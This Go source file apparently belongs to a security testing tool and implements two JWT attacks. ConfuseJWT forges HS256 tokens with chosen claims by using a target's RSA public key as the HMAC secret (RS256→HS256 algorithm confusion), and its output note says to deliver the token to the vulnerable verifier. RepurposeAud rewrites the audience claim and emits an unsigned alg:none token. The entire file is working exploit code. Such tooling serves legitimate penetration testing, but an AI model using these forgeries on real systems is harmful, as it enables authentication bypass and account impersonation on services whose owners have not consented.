package token

import (
	"crypto/hmac"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// ConfuseResult reports the outcome of an RS256→HS256 confusion attempt.
type ConfuseResult struct {
	OriginalAlg string `json:"original_alg"`
	ForgedAlg   string `json:"forged_alg"`
	PublicKeyN  string `json:"public_key_n_preview"`
	ForgedToken string `json:"forged_token"`
	Note        string `json:"note"`
}

// jwtHeader is the decoded JWT header.
type jwtHeader struct {
	Alg string `json:"alg"`
	Typ string `json:"typ,omitempty"`
	Kid string `json:"kid,omitempty"`
}

// ConfuseJWT performs the classic RS256→HS256 algorithm-confusion
// forgery: when a verifier accepts HS256 and uses the RSA public key
// (from JWKS) as the HMAC secret, an attacker can sign arbitrary
// claims with that public key.
//
// token is the original RS256 JWT whose header/claims are preserved;
// pubKey is the RSA public key fetched from the target's JWKS;
// overrides optionally replace claim values in the forged token.
func ConfuseJWT(token string, pubKey *rsa.PublicKey, overrides map[string]any) (*ConfuseResult, error) {
	if pubKey == nil {
		return nil, fmt.Errorf("public key is nil")
	}
	
	// Validate modulus size before use (F-001/F-008 regression hardening:
	// a too-short modulus previously panicked on slice bounds).
	modBytes := pubKey.N.Bytes()
	if len(modBytes) < 8 {
		return nil, fmt.Errorf("modulus too short: %d bytes (minimum 8 bytes for preview, 128 for security)", len(modBytes))
	}

	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("not a JWT (got %d parts)", len(parts))
	}

	var hdr jwtHeader
	hdrJSON, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil, fmt.Errorf("decode header: %w", err)
	}
	if err := json.Unmarshal(hdrJSON, &hdr); err != nil {
		return nil, err
	}
	if !strings.EqualFold(hdr.Alg, "RS256") && !strings.EqualFold(hdr.Alg, "RS384") && !strings.EqualFold(hdr.Alg, "RS512") {
		return nil, fmt.Errorf("token is %q; confusion applies to RS* tokens", hdr.Alg)
	}

	// New header: HS256, keep kid (verifier may select the key by it).
	forgedHdr := map[string]any{"alg": "HS256", "typ": "JWT"}
	if hdr.Kid != "" {
		forgedHdr["kid"] = hdr.Kid
	}
	hdrB64, err := b64urlJSON(forgedHdr)
	if err != nil {
		return nil, err
	}

	// Claims: original payload with overrides applied.
	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, fmt.Errorf("decode payload: %w", err)
	}
	var claims map[string]any
	if err := json.Unmarshal(payload, &claims); err != nil {
		return nil, err
	}
	for k, v := range overrides {
		claims[k] = v
	}
	payloadB64, err := b64urlJSON(claims)
	if err != nil {
		return nil, err
	}

	// HMAC-SHA256 over header.payload, keyed with the RSA public key
	// DER subjectPublicKeyInfo bytes (the "confused" secret).
	signingInput := hdrB64 + "." + payloadB64
	mac := hmac.New(sha256.New, publicKeySecret(pubKey))
	mac.Write([]byte(signingInput))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

	return &ConfuseResult{
		OriginalAlg: hdr.Alg,
		ForgedAlg:   "HS256",
		PublicKeyN:  fmt.Sprintf("%x", pubKey.N.Bytes()[:8]) + "...",
		ForgedToken: signingInput + "." + sig,
		Note: "Deliver the forged token to the vulnerable verifier. " +
			"Only works when the service validates HS256 with the JWKS public key as HMAC secret (alg confusion).",
	}, nil
}

// publicKeySecret renders the RSA public key the way a confused
// verifier would typically ingest it: PKIX DER bytes of the
// SubjectPublicKeyInfo.
func publicKeySecret(pub *rsa.PublicKey) []byte {
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		// Fall back to modulus bytes.
		return pub.N.Bytes()
	}
	return der
}

// RepurposeResult reports an aud-claim repurposing.
type RepurposeResult struct {
	OriginalAud string `json:"original_aud"`
	NewAud      string `json:"new_aud"`
	UnsignedToken string `json:"unsigned_token"`
	Note        string `json:"note"`
}

// RepurposeAud rewrites the `aud` claim of a JWT and returns the
// token in an unsigned (alg:none) form. Aud-confusion abuse relies on
// a resource accepting tokens whose signature it doesn't validate or
// whose key it shares (e.g., same-tenant symmetric keys); the unsigned
// form is the canonical test artifact for that class.
func RepurposeAud(token, newAud string) (*RepurposeResult, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("not a JWT (got %d parts)", len(parts))
	}

	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, fmt.Errorf("decode payload: %w", err)
	}
	var claims map[string]any
	if err := json.Unmarshal(payload, &claims); err != nil {
		return nil, err
	}

	oldAud, _ := claims["aud"].(string)
	if oldAud == "" {
		// aud may be an array.
		if arr, ok := claims["aud"].([]any); ok && len(arr) > 0 {
			oldAud = fmt.Sprint(arr[0])
		}
	}
	claims["aud"] = newAud

	hdr := map[string]any{"alg": "none", "typ": "JWT"}
	hdrB64, _ := b64urlJSON(hdr)
	payloadB64, err := b64urlJSON(claims)
	if err != nil {
		return nil, err
	}

	return &RepurposeResult{
		OriginalAud:   oldAud,
		NewAud:        newAud,
		UnsignedToken: hdrB64 + "." + payloadB64 + ".",
		Note: "aud-confusion test artifact. Only exploitable when the resource skips signature validation " +
			"or shares signing material across resources.",
	}, nil
}

func b64urlJSON(v any) (string, error) {
	data, err := json.Marshal(v)
	if err != nil {
		return "", err
	}
	return base64.RawURLEncoding.EncodeToString(data), nil
}
